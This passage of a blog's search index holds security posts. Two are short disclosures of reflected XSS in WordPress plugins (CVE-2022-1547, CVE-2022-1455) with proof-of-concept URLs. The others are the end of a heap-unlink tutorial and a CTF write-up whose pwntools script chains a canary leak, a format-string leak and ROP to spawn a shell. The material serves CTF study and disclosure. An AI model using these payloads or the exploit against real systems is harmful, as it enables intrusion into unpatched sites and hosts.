-g</code>编译，然后gdb调试。<br>chunk0_ptr是全局指针变量，在这里是为了伪造和chunk1_ptr相邻且已经free的chunk，因此在<code>free(chunk1_ptr)</code>时就会触发fake chunk的unlink操作。</p><p><img src="https://i.imgur.com/fvLIQxT.png"><br>这段代码是为了伪造fake chunk，绕过上面提到的检查。</p><p><img src="https://i.imgur.com/9rm9aI8.png"><br>这段代码是为了修改chunk1_ptr的chunk头部来使chunk1的prev_size字段值等于fake chunk的大小并且prev_inuse字段为0来使fake chunk为空闲状态。</p><p>我们用gdb调试，可以看到chunk0和chunk1两个chunk<br><img src="https://i.imgur.com/hIs2t6A.png"></p><p>然后填充chunk0中的fake chunk<br><img src="https://i.imgur.com/jYVFTsy.png"></p><p>然后伪造chunk1的prev_size位和prev_inuse位<br><img src="https://i.imgur.com/g4d4e2s.png"><br>之后<code>free(chunk1_ptr)</code>就会使fake chunk触发unlink操作，使得chunk0_ptr指针指向<em>chunk0_ptr[2]，也就是&amp;chunk0_ptr - 0x18<br><img src="https://i.imgur.com/fxmSrmF.png"><br>此时让chunk0_ptr[3] &#x3D; victim_string，也就是</em>（chunk0_ptr + 0x18） &#x3D; *(&amp;chunk0_ptr - 0x18 + 0x18) &#x3D; chunk0_ptr &#x3D; victim_string<br><img src="https://i.imgur.com/vvmINxX.png"><br>可能画个图好理解一点</p><p><img src="https://i.imgur.com/bn72gva.png"></p><h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><p>在这里说一下为什么chunk0_ptr[2]要填&amp;chunk0_ptr-0x18，前面为什么要加取址符？<br>是因为在检查时，会检查<code>FD-&gt;bk == P</code>,即*((p-&gt;fd)+0x18)&#x3D;&#x3D;p，也就是FD指针+0x18的位置所填的内容应该是p,如果chunk0_ptr[2]也就是p-&gt;fd填的是p-0x18的话，左边&#x3D;p!&#x3D;p&#x3D;右边,所以这里需要填的应该是&amp;chunk0_ptr-0x18</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://lantern.cool/note-pwn-unlink/">Unlink</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>wp_check_email</title>
    <link href="/2022/04/22/wp-check-email/"/>
    <url>/2022/04/22/wp-check-email/</url>
    
    <content type="html"><![CDATA[<h1 id="Check-amp-Log-email-lt-x3D-1-0-5-Reflected-XSS（CVE-2022-1547）"><a href="#Check-amp-Log-email-lt-x3D-1-0-5-Reflected-XSS（CVE-2022-1547）" class="headerlink" title="Check &amp; Log email &lt;&#x3D; 1.0.5 Reflected XSS（CVE-2022-1547）"></a>Check &amp; Log email &lt;&#x3D; 1.0.5 Reflected XSS（CVE-2022-1547）</h1><p>In file <code>check-email\include\Core\UI\Page\Check_Email_Settings_Page.php</code> <code>$_GET[&#39;tab&#39;]</code>does not sanitized and leading a Reflected XSS.</p><p><img src="/2022/04/22/wp-check-email/1.png"></p><p>POC:</p><figure class="highlight awk"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/wp-admin/</span>admin.php?page=check-email-settings&amp;tab=<span class="hljs-string">&quot;&gt; &lt;input type=&quot;</span>text<span class="hljs-string">&quot; name=&quot;</span>test<span class="hljs-string">&quot; value=&quot;</span>xxxxx<span class="hljs-string">&quot; onmouseover=alert(1) test=&quot;</span><span class="hljs-string">&quot;/</span><br></code></pre></td></tr></table></figure><p><img src="/2022/04/22/wp-check-email/2.png"></p>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>XSS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>wp_call_now_button</title>
    <link href="/2022/04/22/wp-call-now-button/"/>
    <url>/2022/04/22/wp-call-now-button/</url>
    
    <content type="html"><![CDATA[<h1 id="call-now-button-lt-x3D-1-1-1-Reflected-XSS（CVE-2022-1455）"><a href="#call-now-button-lt-x3D-1-1-1-Reflected-XSS（CVE-2022-1455）" class="headerlink" title="call now button &lt;&#x3D; 1.1.1 Reflected XSS（CVE-2022-1455）"></a>call now button &lt;&#x3D; 1.1.1 Reflected XSS（CVE-2022-1455）</h1><p>In file <code>/call-now-button/src/admin/action/CnbActionViewEdit.php</code> <code>$_REQUEST[&quot;bid&quot;]</code>does not sanitized properly and leading a Reflected XSS.</p><p><img src="/2022/04/22/wp-call-now-button/1.png"></p><p>And <code>$button-&gt;type = &#39;SINGLE&#39; </code>defaultly.</p><p><img src="/2022/04/22/wp-call-now-button/2.png"></p><p>If we want to trigger this xss, we need activate premium first, it’s for free.</p><p><img src="/2022/04/22/wp-call-now-button/3.png"> </p><p>POC:</p><p>According to <a href="https://portswigger.net/research/xss-in-hidden-input-fields">this article</a>, To trigger this xss we need press Shift + Alt + X in windows or Ctrl + Alt + X In macos.</p><figure class="highlight awk"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span><span class="hljs-regexp">/wp-admin/</span>admin.php?page=call-now-button&amp;bid=xxxxx<span class="hljs-string">&quot; accesskey=X onclick=alert(1) test=&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2022/04/22/wp-call-now-button/4.png"></p>]]></content>
    
    
    <categories>
      
      <category>CVE</category>
      
    </categories>
    
    
    <tags>
      
      <tag>XSS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2022虎符babygame</title>
    <link href="/2022/04/06/2022%E8%99%8E%E7%AC%A6babygame/"/>
    <url>/2022/04/06/2022%E8%99%8E%E7%AC%A6babygame/</url>
    
    <content type="html"><![CDATA[<p>比赛中没写出来，照着别人的wp复现了一下，记录下一些知识点。</p><p>题目还算是常规的那种，可以很明显看到漏洞是栈溢出和格式化字符串漏洞。</p><p><img src="/2022/04/06/2022%E8%99%8E%E7%AC%A6babygame/2022-04-04_224726.png"></p><p>首先是栈溢出为猜数游戏设置种子，并且泄露出canary的值。<br>然后通过猜数游戏（CDLL库可自行百度），进入13E7函数，</p><p>格式化字符串泄露出libcbase和elfbase，并且将ret addr改为sub_13E7函数，重新进入sub_13E7函数。</p><p><img src="/2022/04/06/2022%E8%99%8E%E7%AC%A6babygame/2022-04-05_173926.png"></p><p>此时将ret addr改为main函数，再用利用main函数中的栈溢出漏洞写入rop链，最后拿到shell。</p><p>rop链要加ret的原因是栈未对齐<br><img src="/2022/04/06/2022%E8%99%8E%E7%AC%A6babygame/2022-04-05_174749.png"></p><p>可以看到，红框的语句的作用是检查rsp+0x50是否是0x10的倍数，显然不是，因此要加ret。</p><p>EXP：</p><figure class="highlight apache"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></div></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><span class="hljs-attribute">from</span> ctypes import cdll, CDLL<br><br><br><span class="hljs-attribute">context</span>.log_level = <span class="hljs-string">&quot;debug&quot;</span><br><br><span class="hljs-attribute">p</span> = process(&#x27;./babygame&#x27;)<br><br><span class="hljs-comment">#cmd = &quot;b *%d\n&quot; %(base+0x141c)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br><br><br><span class="hljs-attribute">base</span> = p.libs()[<span class="hljs-string">&quot;/hufu/babygame/37ae6078e4e24dcc8196e39efbe8c0bc/37ae6078e4e24dcc8196e39efbe8c0bc/babygame&quot;</span>]<br><br><span class="hljs-attribute">cmd</span> = <span class="hljs-string">&quot;b *%d\n&quot;</span> %(base+<span class="hljs-number">0</span>x1449)<br><span class="hljs-attribute">gdb</span>.attach(p, cmd)<br><br><br><span class="hljs-attribute">name</span> = b<span class="hljs-string">&quot;b&quot;</span>*<span class="hljs-number">0</span>x100+p64(<span class="hljs-number">0</span>x6161616161616161)+b<span class="hljs-string">&quot;a&quot;</span><br><br><span class="hljs-attribute">p</span>.sendafter(<span class="hljs-string">&quot; your name:\n&quot;</span>, name)<br><br><span class="hljs-attribute">p</span>.recvuntil(<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">9</span>)<br><br><span class="hljs-attribute">canary</span> = u64(b<span class="hljs-string">&quot;\x00&quot;</span>+p.recv(<span class="hljs-number">7</span>))<br><br><span class="hljs-attribute">rbp</span> = u64(p.recvuntil(<span class="hljs-string">&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, b<span class="hljs-string">&quot;\x00&quot;</span>))<br><span class="hljs-comment">#print(hex(canary))</span><br><br><span class="hljs-comment">#success(hex(canary))</span><br><span class="hljs-comment">#success(hex(rbp))</span><br><br><span class="hljs-attribute">libc</span> = CDLL(<span class="hljs-string">&quot;libc-2.31.so&quot;</span>)<br><span class="hljs-attribute">libc</span>.srand(<span class="hljs-number">0</span>x6161616161616161)<br><br><br><span class="hljs-attribute">for</span> i in range(<span class="hljs-number">100</span>):<br>    <span class="hljs-attribute">p</span>.sendlineafter(<span class="hljs-string">&quot; \n&quot;</span>, str((libc.rand()+<span class="hljs-number">1</span>)%<span class="hljs-number">3</span>))<br><br><br><span class="hljs-comment">#cmd = &quot;b *%d\n&quot; %(base+0x141c)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br><br><span class="hljs-attribute">payload</span> = b<span class="hljs-string">&quot;%62c%9$hhn&quot;</span><br><span class="hljs-attribute">payload</span> += b<span class="hljs-string">&quot;q%79$p&quot;</span><br><span class="hljs-attribute">payload</span> += b<span class="hljs-string">&quot;ff%83$pl&quot;</span><br><span class="hljs-attribute">payload</span> += p64(rbp-<span class="hljs-number">0</span>x218)<br><span class="hljs-attribute">p</span>.sendafter(&#x27;Good luck to you.\n&#x27;, payload)<br><br><span class="hljs-attribute">p</span>.recvuntil(<span class="hljs-string">&quot;q&quot;</span>)<br><span class="hljs-attribute">leak</span> = int(p.recv(<span class="hljs-number">14</span>), <span class="hljs-number">16</span>)<br><span class="hljs-attribute">libc_base</span>= leak - <span class="hljs-number">0</span>x240b3<br><span class="hljs-comment">#success(hex(leak))</span><br><span class="hljs-comment">#success(hex(libc_base))</span><br><br><br><span class="hljs-attribute">p</span>.recvuntil(<span class="hljs-string">&quot;ff&quot;</span>)<br><span class="hljs-attribute">elf_base</span> = int(p.recv(<span class="hljs-number">14</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0</span>x1465<br><span class="hljs-comment">#success(hex(elf_base))</span><br><br><span class="hljs-attribute">target</span> = (elf_base+<span class="hljs-number">0</span>x148e)&amp;<span class="hljs-number">0</span>xffff<br><span class="hljs-attribute">payload</span> = <span class="hljs-string">&quot;%&#123;&#125;c%9$hn&quot;</span>.format(target).encode()<br><span class="hljs-attribute">payload</span> = payload.ljust(<span class="hljs-number">0</span>x10, b&#x27;a&#x27;)<br><span class="hljs-attribute">payload</span> += p64(rbp-<span class="hljs-number">0</span>x218)<br><br><span class="hljs-attribute">p</span>.sendafter(&#x27;Good luck to you.\n&#x27;, payload)<br><br><span class="hljs-attribute">payload2</span> = b&#x27;q&#x27;*<span class="hljs-number">0</span>x108+p64(canary)+b<span class="hljs-string">&quot;b&quot;</span>*<span class="hljs-number">0</span>x18<br><br><span class="hljs-attribute">pop_rdi_ret</span> = libc_base + <span class="hljs-number">0</span>x0000000000023b72<br><span class="hljs-attribute">bin_sh</span> = libc_base + <span class="hljs-number">0</span>x1b45bd<br><span class="hljs-attribute">system_addr</span> = libc_base + <span class="hljs-number">0</span>x522c0<br><span class="hljs-attribute">ret</span> = elf_base + <span class="hljs-number">0</span>x1565<br><br><span class="hljs-attribute">payload2</span> += p64(pop_rdi_ret) + p64(bin_sh) + p64(ret) + p64(system_addr)<br><br><span class="hljs-attribute">p</span>.sendafter(<span class="hljs-string">&quot; your name:\n&quot;</span>, payload2)<br><br><span class="hljs-attribute">p</span>.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
